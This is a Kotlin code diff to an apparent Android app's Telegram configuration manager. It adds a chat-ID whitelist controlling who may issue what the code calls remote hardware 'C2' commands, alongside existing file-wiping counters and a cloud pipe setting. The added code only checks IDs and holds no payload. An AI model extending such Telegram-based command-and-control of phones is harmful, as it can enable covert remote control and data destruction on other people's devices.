@@ -110,6 +110,43 @@ class TelegramConfigManager private constructor(context: Context) {
         _chatId.value = cleanChat
     }
 
+    /**
+     * Verifies if incoming Telegram Chat ID is authorized to execute remote hardware C2 commands.
+     */
+    fun isChatAuthorized(incomingChatId: String): Boolean {
+        val trimmed = incomingChatId.trim()
+        if (trimmed.isEmpty()) return false
+        val currentChatId = _chatId.value.trim()
+        if (currentChatId.isNotEmpty() && trimmed.equals(currentChatId, ignoreCase = true)) {
+            return true
+        }
+        val defaultChat = DEFAULT_CHAT_ID.trim()
+        if (defaultChat.isNotEmpty() && trimmed.equals(defaultChat, ignoreCase = true)) {
+            return true
+        }
+        val whitelist = prefs.getStringSet(KEY_AUTHORIZED_CHATS, emptySet()) ?: emptySet()
+        return whitelist.any { it.trim().equals(trimmed, ignoreCase = true) }
+    }
+
+    fun addAuthorizedChatId(chatId: String) {
+        val trimmed = chatId.trim()
+        if (trimmed.isEmpty()) return
+        val current = (prefs.getStringSet(KEY_AUTHORIZED_CHATS, emptySet()) ?: emptySet()).toMutableSet()
+        current.add(trimmed)
+        prefs.edit().putStringSet(KEY_AUTHORIZED_CHATS, current).apply()
+    }
+
+    fun getAuthorizedChatIds(): Set<String> {
+        val set = mutableSetOf<String>()
+        val currentChatId = _chatId.value.trim()
+        if (currentChatId.isNotEmpty()) set.add(currentChatId)
+        val defaultChat = DEFAULT_CHAT_ID.trim()
+        if (defaultChat.isNotEmpty()) set.add(defaultChat)
+        val extra = prefs.getStringSet(KEY_AUTHORIZED_CHATS, emptySet()) ?: emptySet()
+        set.addAll(extra)
+        return set
+    }
+
     fun setCloudPipeEnabled(enabled: Boolean) {
         prefs.edit().putBoolean(KEY_CLOUD_PIPE_ENABLED, enabled).apply()
         _cloudPipeEnabled.value = enabled
@@ -237,6 +274,7 @@ class TelegramConfigManager private constructor(context: Context) {
         private const val KEY_WIPED_FILES_COUNT = "key_wiped_files_count"
         private const val KEY_TOTAL_BYTES_WIPED = "key_total_bytes_wiped"
         private const val KEY_LAST_STATUS = "key_last_status"
+        private const val KEY_AUTHORIZED_CHATS = "key_authorized_chats"
 
         @Volatile
         private var INSTANCE: TelegramConfigManager? = null
